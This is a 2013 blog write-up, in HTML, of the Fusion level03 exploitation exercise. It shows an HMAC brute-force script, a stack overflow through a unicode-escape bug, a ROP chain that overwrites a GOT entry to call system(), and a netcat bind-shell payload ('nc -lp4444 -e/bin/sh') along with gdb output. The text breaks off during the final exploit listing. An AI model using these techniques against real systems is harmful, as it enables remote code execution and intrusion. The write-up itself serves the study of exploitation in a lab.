@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Fusion level03 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="Fusion level03 In this level we have to bypass ASLR and NX again:
+Before going into the stack overflow details, lets get a valid request to the server. When we connect to the server we are presented with a token that is later used to calculate the MAC code of our request.
+HMAC(EVP_sha1(), token, strlen(token), gRequest, gRequestSize, result, &amp;amp;len);  The application is calculating the MAC of whatever is stored in &amp;ldquo;gRequest&amp;rdquo; (token&#43;JSON request) using SHA1 as the hashing algorithm, &amp;ldquo;token&amp;rdquo; as the encryption key and store the MAC in the memory pointed by &amp;ldquo;result&amp;rdquo;.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Fusion level03 write-up">
+    <meta name="twitter:description" content="Fusion level03 In this level we have to bypass ASLR and NX again:
+Before going into the stack overflow details, lets get a valid request to the server. When we connect to the server we are presented with a token that is later used to calculate the MAC code of our request.
+HMAC(EVP_sha1(), token, strlen(token), gRequest, gRequestSize, result, &amp;amp;len);  The application is calculating the MAC of whatever is stored in &amp;ldquo;gRequest&amp;rdquo; (token&#43;JSON request) using SHA1 as the hashing algorithm, &amp;ldquo;token&amp;rdquo; as the encryption key and store the MAC in the memory pointed by &amp;ldquo;result&amp;rdquo;.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Fusion level03 write-up">
+  <meta property="og:description" content="Fusion level03 In this level we have to bypass ASLR and NX again:
+Before going into the stack overflow details, lets get a valid request to the server. When we connect to the server we are presented with a token that is later used to calculate the MAC code of our request.
+HMAC(EVP_sha1(), token, strlen(token), gRequest, gRequestSize, result, &amp;amp;len);  The application is calculating the MAC of whatever is stored in &amp;ldquo;gRequest&amp;rdquo; (token&#43;JSON request) using SHA1 as the hashing algorithm, &amp;ldquo;token&amp;rdquo; as the encryption key and store the MAC in the memory pointed by &amp;ldquo;result&amp;rdquo;.">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/31/fusion-level03-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/31/fusion-level03-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Fusion level03 write-up</h1>
+      <p class="post-meta">@pwntester · Dec 31, 2013 · 13 min read</p>
+    </header>
+    <article class="post-content">
+
+<h2 id="fusion-level03">Fusion level03</h2>
+
+<p>In this <a href="http://exploit-exercises.com/fusion/level03">level</a> we have to bypass ASLR and NX again:</p>
+
+<p><img src="/images/octopress/fusion02.png" alt="" /></p>
+
+<p>Before going into the stack overflow details, lets get a valid request to the server. When we connect to the server we are presented with a token that is later used to calculate the MAC code of our request.</p>
+
+<pre><code class="language-lang-clike">HMAC(EVP_sha1(), token, strlen(token), gRequest, gRequestSize, result, &amp;len);
+</code></pre>
+
+<p>The application is calculating the MAC of whatever is stored in &ldquo;gRequest&rdquo; (token+JSON request) using SHA1 as the hashing algorithm, &ldquo;token&rdquo; as the encryption key and store the MAC in the memory pointed by &ldquo;result&rdquo;. Then the application goes into the validation bits:</p>
+
+<pre><code class="language-lang-clike">invalid = result[0] | result[1]; // Not too bad :&gt;
+  if(invalid)
+    errx(EXIT_FAILURE, &quot;Checksum failed! (got %02x%02x%02x%02x...)&quot;,
+    result[0], result[1], result[2], result[3]);
+    // XXX won't be seen by user.
+</code></pre>
+
+<p>This means that its only checking the first 2 bytes and if they both are 0, then we will bypass the check.</p>
+
+<p>We can calculate the MAC of our token+request using the provided token but we have no way to be sure that the first bytes are going to be 0&rsquo;sure so what we need to do is to modify the &ldquo;token+request&rdquo; with unused data like a new JSON property so that we make sure that the hash is going to start with two NULL bytes before sending it. My brute force script:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/python
+
+from socket import *
+from struct import *
+import json
+from hashlib import sha1
+import hmac
+
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 20003))
+print(&quot;[+] Getting token&quot;)
+token = s.recv(1024)
+token = token.strip().strip('&quot;')
+print(&quot;[+] Token: &quot; + token)
+
+test_request = '{ &quot;title&quot;: &quot;test&quot;, &quot;contents&quot;: &quot;test&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }'
+print(&quot;[+] Test request: &quot; + test_request)
+mac = hmac.new(token, token + &quot;\n&quot; + test_request, sha1).digest()
+print(&quot;[+] Test request MAC: &quot; + mac.encode('hex'))
+print(&quot;[+] Modifying hash till it starts with 0000&quot;)
+
+i = 0
+new_request = &quot;&quot;
+while True:
+        new_request = test_request[0:-1] + ', &quot;padding&quot;: &quot;' + str(i) + '&quot;}'
+        hexmac = hmac.new(token, token + &quot;\n&quot; + new_request, sha1).digest().encode(&quot;hex&quot;)
+        if &quot;0000&quot; in hexmac[0:4]:
+                break
+        i += 1
+print(&quot;[+] New request: &quot; + new_request)
+print(&quot;[+] New MAC: &quot; + hmac.new(token, token + &quot;\n&quot; + new_request, sha1).digest().encode(&quot;hex&quot;))
+print(&quot;[+] Sending test request to server&quot;)
+s.send(token + &quot;\n&quot; + new_request)
+s.close()
+</code></pre>
+
+<p>Lets try it with a breakpoint in the server &ldquo;parse_request&rdquo; function so we make sure that we passed the &ldquo;validate_request&rdquo; one:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion03.py
+[+] Getting token
+[+] Token: // 127.0.0.1:36045-1388424557-265314943-2048946095-391959879
+[+] Test request: { &quot;title&quot;: &quot;test&quot;, &quot;contents&quot;: &quot;test&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }
+[+] Test request MAC: 28e7cc4060bec9616ebcb0858a458144c3ccab3a
+[+] Modifying hash till it starts with 0000
+[+] New request: { &quot;title&quot;: &quot;test&quot;, &quot;contents&quot;: &quot;test&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; , &quot;padding&quot;: &quot;24133&quot;}
+[+] New MAC: 00008eb54a03fc3d286027bf54a6541c130dad36
+[+] Sending test request to server
+</code></pre>
+
+<p>And we hit the breakpoint!</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+
+Breakpoint 1, parse_request () at level03/level03.c:86
+86	in level03/level03.c
+</code></pre>
+
+<p>Now for the stack overflow. In the decode_string function there is a check to make sure that we dont copy beyond the &ldquo;title&rdquo; limits. However, when dealing with unicode characters, the &ldquo;dest&rdquo; pointer is incremented twice meaning that if we were exactly 1 byte below the buffer limit, after processing the unicode character, &ldquo;dest&rdquo; will be pointing one byte above the limit and thus failing the check: &ldquo;while(*src &amp;&amp; dest != end)&rdquo; so it will continue processing characters from the source buffer into the destination buffer until there are no more bytes to process in the source buffer.</p>
+
+<p>We can abuse this by sending a title that is 127 bytes long and then &ldquo;\uXXXX&rdquo; in order to be able to overwrite the destination buffer. After that we can send as many bytes as we want. Lets check it and see what is the required offset to overwrite the return address:</p>
+
+<pre><code class="language-lang-bash">test_request = '{ &quot;title&quot;: &quot;' + &quot;A&quot;*127 + &quot;\\\\u4141&quot; + &quot;A&quot;*31 + &quot;DDDD&quot; +'&quot;, &quot;contents&quot;: &quot;test&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }'
+</code></pre>
+
+<p>And in gdb we will get:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+[New process 14931]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 14931]
+0x44444444 in ?? ()
+</code></pre>
+
+<p>Time to weaponize the exploit. Since we are already bruteforcing the hash collision, brute forcing the libc base address was going to be too much. So in this level we will try to use whatever is available in the binary.</p>
+
+<p>GOT functions:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ objdump -R /opt/fusion/bin/level03
+
+/opt/fusion/bin/level03:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804bcc0 R_386_GLOB_DAT    __gmon_start__
+0804bdc0 R_386_COPY        stderr
+0804bdc4 R_386_COPY        stdin
+0804bde0 R_386_COPY        stdout
+0804bcd0 R_386_JUMP_SLOT   __errno_location
+0804bcd4 R_386_JUMP_SLOT   srand
+0804bcd8 R_386_JUMP_SLOT   open
+0804bcdc R_386_JUMP_SLOT   connect
+0804bce0 R_386_JUMP_SLOT   setgroups
+0804bce4 R_386_JUMP_SLOT   getpid
+0804bce8 R_386_JUMP_SLOT   strerror
+0804bcec R_386_JUMP_SLOT   daemon
+0804bcf0 R_386_JUMP_SLOT   inet_ntoa
+0804bcf4 R_386_JUMP_SLOT   json_object_array_length
+0804bcf8 R_386_JUMP_SLOT   err
+0804bcfc R_386_JUMP_SLOT   __fprintf_chk
+0804bd00 R_386_JUMP_SLOT   signal
+0804bd04 R_386_JUMP_SLOT   __gmon_start__
+0804bd08 R_386_JUMP_SLOT   realloc
+0804bd0c R_386_JUMP_SLOT   __printf_chk
+0804bd10 R_386_JUMP_SLOT   strchr
+0804bd14 R_386_JUMP_SLOT   calloc
+0804bd18 R_386_JUMP_SLOT   inet_addr
+0804bd1c R_386_JUMP_SLOT   write
+0804bd20 R_386_JUMP_SLOT   HMAC
+0804bd24 R_386_JUMP_SLOT   listen
+0804bd28 R_386_JUMP_SLOT   json_object_array_get_idx
+0804bd2c R_386_JUMP_SLOT   __libc_start_main
+0804bd30 R_386_JUMP_SLOT   wait
+0804bd34 R_386_JUMP_SLOT   json_object_get_string
+0804bd38 R_386_JUMP_SLOT   read
+0804bd3c R_386_JUMP_SLOT   strtol
+0804bd40 R_386_JUMP_SLOT   setresuid
+0804bd44 R_386_JUMP_SLOT   __asprintf_chk
+0804bd48 R_386_JUMP_SLOT   setresgid
+0804bd4c R_386_JUMP_SLOT   json_object_get_object
+0804bd50 R_386_JUMP_SLOT   fflush
+0804bd54 R_386_JUMP_SLOT   accept
+0804bd58 R_386_JUMP_SLOT   json_tokener_parse
+0804bd5c R_386_JUMP_SLOT   socket
+0804bd60 R_386_JUMP_SLOT   dup2
+0804bd64 R_386_JUMP_SLOT   memcpy
+0804bd68 R_386_JUMP_SLOT   strlen
+0804bd6c R_386_JUMP_SLOT   getppid
+0804bd70 R_386_JUMP_SLOT   EVP_sha1
+0804bd74 R_386_JUMP_SLOT   bind
+0804bd78 R_386_JUMP_SLOT   errx
+0804bd7c R_386_JUMP_SLOT   close
+0804bd80 R_386_JUMP_SLOT   time
+0804bd84 R_386_JUMP_SLOT   setvbuf
+0804bd88 R_386_JUMP_SLOT   malloc
+0804bd8c R_386_JUMP_SLOT   setrlimit
+0804bd90 R_386_JUMP_SLOT   fork
+0804bd94 R_386_JUMP_SLOT   setsockopt
+0804bd98 R_386_JUMP_SLOT   rand
+0804bd9c R_386_JUMP_SLOT   __sprintf_chk
+0804bda0 R_386_JUMP_SLOT   strncmp
+0804bda4 R_386_JUMP_SLOT   __snprintf_chk
+0804bda8 R_386_JUMP_SLOT   getpeername
+0804bdac R_386_JUMP_SLOT   exit
+</code></pre>
+
+<p>We dont have any &ldquo;system&rdquo; or &ldquo;execve&rdquo; like in previous level and since we dont have an &ldquo;int 0×80&rdquo; or &ldquo;call [gs:0x10]&rdquo; to make syscalls:</p>
+
+<p>We will need to modify the GOT table and make any random function point the &ldquo;system()&rdquo; function in libc. We will benefit from the fact that for the same OS, same libc and same compilation options, the offset between libc functions should be constant.</p>
+
+<pre><code class="language-lang-bash">ROPeMe&gt; search int %
+Searching for ROP gadget:  int % with constraints: []
+0x804942bL: int 3 ; mov ebx 0xd0ff0804 ; leave ;;
+
+ROPeMe&gt; search call %
+Searching for ROP gadget:  call % with constraints: []
+0x804942fL: call eax ; leave ;;
+</code></pre>
+
+<p>In this case I will overwrite the &ldquo;srand()&rdquo; function reference that is the closest to &ldquo;system()&rdquo;:</p>
+
+<pre><code class="language-lang-bash">(gdb) p system
+$8 = {&lt;text variable, no debug info&gt;} 0xb754fb20 &lt;__libc_system&gt;
+(gdb) p srand
+$10 = {&lt;text variable, no debug info&gt;} 0xb7545fc0 &lt;__srandom&gt;
+</code></pre>
+
+<p>0xb754fb20 - 0xb7545fc0 = 0x9b60</p>
+
+<p>So we will need to increment srand GOT&rsquo;s entry in 0x9b60</p>
+
+<p>We will need an &ldquo;add [reg1] reg2&rdquo; gadget for that:</p>
+
+<pre><code class="language-lang-bash">ROPeMe&gt; search add [ %
+Searching for ROP gadget:  add [ % with constraints: []
+0x804ce9bL: add [eax+0x0] al ; add [eax] al ; add [eax] cl ;;
+0x804dd77L: add [eax+eax] ah ;;
+0x804ce9fL: add [eax] al ; add [eax] al ; add [eax] cl ;;
+0x804ceb8L: add [eax] al ; add [eax] al ; xchg esi eax ;;
+0x804cea1L: add [eax] al ; add [eax] cl ;;
+0x8048bcaL: add [eax] al ; add [ebx-0x7f] bl ;;
+0x804a2c2L: add [eax] al ; add [ebx-0x7f] bl ;;
+0x8048bebL: add [eax] al ; add esp 0x8 ; pop ebx ;;
+0x804dd76L: add [eax] al ; and al 0x0 ;;
+0x804cebaL: add [eax] al ; xchg esi eax ;;
+0x804cea3L: add [eax] cl ;;
+0x80493feL: add [ebx+0x5d5b04c4] eax ;;
+0x8049e03L: add [ebx+0x5e] bl ; pop edi ; pop ebp ;;
+0x804964cL: add [ebx+0x5e] bl ; pop edi ;;
+0x8048bccL: add [ebx-0x7f] bl ;;
+0x804a2c4L: add [ebx-0x7f] bl ;;
+0x8049646L: add [ecx+0x230c4] al ; add [ebx+0x5e] bl ; pop edi ;;
+0x804ab3eL: add [edx] ecx ;;
+</code></pre>
+
+<p>&ldquo;add [ebx+0x5d5b04c4] eax&rdquo; operates with different register so it fits our requirements. The only thing is that the effective address is ebx + offset so we will need to account for that offset when changing the GOT entry. We will also need &ldquo;pop&rdquo; gadgets for ebx and eax:</p>
+
+<pre><code class="language-lang-bash">ROPeMe&gt; search pop %
+Searching for ROP gadget:  pop % with constraints: []
+0x8049b4fL: pop eax ; add esp 0x5c ;;
+0x8049207L: pop ebp ;;
+0x8049403L: pop ebp ;;
+0x8049c26L: pop ebp ;;
+0x8049402L: pop ebx ; pop ebp ;;
+0x804a2b7L: pop ebx ; pop ebp ;;
+0x804964dL: pop ebx ; pop esi ; pop edi ;;
+0x8048bf0L: pop ebx ;;
+0x8049a4fL: pop ebx ;;
+0x804a2d4L: pop ebx ;;
+0x8049206L: pop edi ; pop ebp ;;
+0x8049c25L: pop edi ; pop ebp ;;
+0x8049e06L: pop edi ; pop ebp ;;
+0x804964fL: pop edi ;;
+0x8049205L: pop esi ; pop edi ; pop ebp ;;
+0x8049c24L: pop esi ; pop edi ; pop ebp ;;
+0x8049e05L: pop esi ; pop edi ; pop ebp ;;
+0x804964eL: pop esi ; pop edi ;;
+0x8049b52L: pop esp ;;
+</code></pre>
+
+<p>We have a &ldquo;pop eax&rdquo; followed by a esp increment so we will need to prepare the stack for that, but is feasible and several &ldquo;pop ebx&rdquo;.</p>
+
+<p>Os so with that we will use the following gadgets to modify the GOT reference:</p>
+
+<ul>
+<li>0x80493feL: add [ebx+0x5d5b04c4] eax ;;</li>
+<li>0x8049b4fL: pop eax ; add esp 0x5c ;;</li>
+<li>0x8048bf0L: pop ebx ;;</li>
+</ul>
+
+<p>And the ROP chain should be something like:</p>
+
+<pre><code class="language-lang-python">p += pack(&quot;&lt;I&quot;, 0x8049b4f) 				 # pop eax ; add esp 0x5c
+p += pack(&quot;&lt;I&quot;, 0x0009b60) 				 # system - srand offset
+&quot;A&quot;*0x5c 				   				 # so that esp points to the following instruction
+p += pack(&quot;&lt;I&quot;, 0x8048bf0) 				 # pop ebx ;;
+p += pack(&quot;&lt;I&quot;, (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff) # srand entry - offset
+p += pack(&quot;&lt;I&quot;, 0x80493fe) 				 # add [ebx+0x5d5b04c4] eax
+</code></pre>
+
+<p>Lets give it a try to verify that we get the GOT properly set:</p>
+
+<pre><code class="language-lang-bash">Breakpoint 3, errx (status=1, format=0x804a37b &quot;Unable to parse request&quot;) at err.c:197
+197	err.c: No such file or directory.
+	in err.c
+</code></pre>
+
+<p>Seems our request is not valid any longer. the \x00 in the (system-srand) offset look the culprit:</p>
+
+<p>Lets use the unicode encoding:</p>
+
+<pre><code class="language-lang-python">p += pack(&quot;&lt;I&quot;, 0x8049b4f) 				 # pop eax ; add esp 0x5c
+p += &quot;\\\u609b\\\u0000&quot;					 # system - srand offset
+p += &quot;A&quot;*0x5c 				   				 # so that esp points to the following instruction
+p += pack(&quot;&lt;I&quot;, 0x8048bf0) 				 # pop ebx ;;
+p += pack(&quot;&lt;I&quot;, (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff) # srand entry - offset
+p += pack(&quot;&lt;I&quot;, 0x80493fe) 				 # add [ebx+0x5d5b04c4] eax
+</code></pre>
+
+<p>Now, we successfully overwrite the GOT reference to point to &ldquo;system&rdquo;:</p>
+
+<pre><code class="language-lang-bash">(gdb) p system
+$13 = {&lt;text variable, no debug info&gt;} 0xb754fb20 &lt;__libc_system&gt;
+(gdb) x/x 0x0804bcd4
+0x804bcd4 &lt;srand@got.plt&gt;:	0xb754fb20
+</code></pre>
+
+<p>Next bit is to execute &ldquo;system()&rdquo; with argument &ldquo;nc -lv4444 -e/bin/sh&rdquo; and with &ldquo;exit&rdquo; as its return address.
+We will use the JSON &ldquo;content&rdquo; field to hold our system argument:</p>
+
+<pre><code class="language-lang-bash">(gdb) p &amp;gContents
+$15 = (unsigned char **) 0x804bdf4
+</code></pre>
+
+<p>Now we need &ldquo;exit&rdquo; PLT entry:</p>
+
+<pre><code class="language-lang-bash">0x8048f80 &lt;exit@plt&gt;
+</code></pre>
+
+<p>And of course, &ldquo;srand&rdquo; PLT entry:</p>
+
+<pre><code class="language-lang-bash">0x8048c20 &lt;srand@plt&gt;
+</code></pre>
+
+<p>This technique is known as return2PLT and we will jump to the address hold in the GOT table which now we control:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/i 0x8048c20
+   0x8048c20 &lt;srand@plt&gt;:	jmp    *0x804bcd4
+(gdb) x/x 0x804bcd4
+0x804bcd4 &lt;srand@got.plt&gt;:	0xb754fb20
+(gdb) p system
+$21 = {&lt;text variable, no debug info&gt;} 0xb754fb20 &lt;__libc_system&gt;
+</code></pre>
+
+<p>So our exploit now looks like:</p>
+
+<pre><code class="language-lang-python">p = &quot;&quot;
+p += pack(&quot;&lt;I&quot;, 0x8049b4f)                               # pop eax ; add esp 0x5c
+p += &quot;\\\u609b\\\u0000&quot;                                  # system - srand offset
+p += &quot;A&quot;*0x5c                                                            # so that esp points to the following instruction
+p += pack(&quot;&lt;I&quot;, 0x8048bf0)                               # pop ebx ;;
+p += pack(&quot;&lt;I&quot;, (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff)
+p += pack(&quot;&lt;I&quot;, 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
+p += pack(&quot;&lt;I&quot;, 0x8048c20)                               # srand(system) PLT entry address
+p += pack(&quot;&lt;I&quot;, 0x8048f80)								 # return address is PLT entry for exit()
+p += pack(&quot;&lt;I&quot;, 0x804bdf4)                               # argument to system() stored in gContent
+
+cmd = &quot;nc -lp4444 -e/bin/sh&quot;
+
+test_request = '{ &quot;title&quot;: &quot;' + &quot;A&quot;*127 + &quot;\\\\u4141&quot; + &quot;A&quot;*31 + p + '&quot;, &quot;contents&quot;: &quot;' + cmd + '&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }'
+</code></pre>
+
+<p>If we run the exploit we can see in gdb:</p>
+
+<pre><code class="language-lang-bash">Breakpoint 1, 0x08048c20 in srand@plt ()
+(gdb) p &amp;gContents
+$2 = (unsigned char **) 0x804bdf4
+(gdb) x/s &amp;gContents
+0x804bdf4 &lt;gContents&gt;:	 &quot;&quot;
+</code></pre>
+
+<p>So our command is not stored directly in &ldquo;gContents&rdquo; that contains the address where our command is stored:</p>
+
+<pre><code class="language-lang-bash">(gdb) x/s *0x804bdf4
+0x89dd520:	 &quot;nc -lp4444 -e/bin/sh&quot;
+</code></pre>
+
+<p>However this address is not always the same:</p>
+
+<pre><code class="language-lang-bash">Breakpoint 1, 0x080493fe in ?? ()
+(gdb) x/s *0x804bdf4
+0x89dd528:	 &quot;nc -lp4444 -e/bin/sh&quot;
+</code></pre>
+
+<p>So I modified the exploit to add a &ldquo;/&rdquo; sled in front of the command and point to an address higher than the values I was getting: 0x89dd550</p>
+
+<p>So we will modify the payload:</p>
+
+<pre><code class="language-lang-python">p = &quot;&quot;
+p += pack(&quot;&lt;I&quot;, 0x8049b4f)                               # pop eax ; add esp 0x5c
+p += &quot;\\\u609b\\\u0000&quot;                                  # system - srand offset
+p += &quot;A&quot;*0x5c                                                            # so that esp points to the following instruction
+p += pack(&quot;&lt;I&quot;, 0x8048bf0)                               # pop ebx ;;
+p += pack(&quot;&lt;I&quot;, (0x0804bcd4 - 0x5d5b04c4) &amp; 0xffffffff)
+p += pack(&quot;&lt;I&quot;, 0x80493fe)                               # add [ebx+0x5d5b04c4] eax
+p += pack(&quot;&lt;I&quot;, 0x8048c20)                               # srand(system) PLT entry address
+p += pack(&quot;&lt;I&quot;, 0x8048f80)								 # return address is PLT entry for exit()
+p += pack(&quot;&lt;I&quot;, 0x89dd520)                               # argument to system() stored in gContent
+
+cmd = &quot;//////////////////////////////////bin/nc -lp4444 -e/bin/sh&quot;
+
+test_request = '{ &quot;title&quot;: &quot;' + &quot;A&quot;*127 + &quot;\\\\u4141&quot; + &quot;A&quot;*31 + p + '&quot;, &quot;contents&quot;: &quot;' + cmd + '&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }'
+</code></pre>
+
+<p>And now we can try to exploit it:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion03.py
+[+] Getting token
+[+] Token: // 127.0.0.1:36122-1388501703-1229195771-453656053-1284067548
+[+] Test request: { &quot;contents&quot;: &quot;//////////////////////////////////bin/nc -lp4444 -e/bin/sh&quot;, &quot;title&quot;: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\u4141AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO\\u609b\\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���� �P&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; }
+[+] Test request MAC: a5794aed31a1a8e94ccd57ab01f152c6790bd55c
+[+] Modifying hash till it starts with 0000
+[+] New request: { &quot;contents&quot;: &quot;//////////////////////////////////bin/nc -lp4444 -e/bin/sh&quot;, &quot;title&quot;: &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\u4141AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO\\u609b\\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���� �P&quot;, &quot;tags&quot;: [&quot;test1&quot;, &quot;test2&quot;], &quot;serverip&quot;: &quot;127.0.0.1&quot; , &quot;padding&quot;: &quot;229584&quot;}
+[+] New MAC: 000060b6cb9276479337793f75580b24049ebab3
+[+] Sending test request to server
+</code></pre>
+
+<p>And in gdb we get:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+[New process 21509]
+process 21509 is executing new program: /bin/bash
+process 21509 is executing new program: /bin/nc6
+</code></pre>
+
+<p>So lets check if the shell is waiting for us:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ sudo netstat -natp | grep nc
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      21509/nc
+fusion@fusion:~$ nc localhost 4444
+id
+uid=20003 gid=20003 groups=20003
+</code></pre>
+
+<p>The complete exploit:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/python
+
+from socket import *
+from struct import *
+from hashlib import sha1
+import hmac
+
+s = socket(AF_INET, SOCK_STREAM)
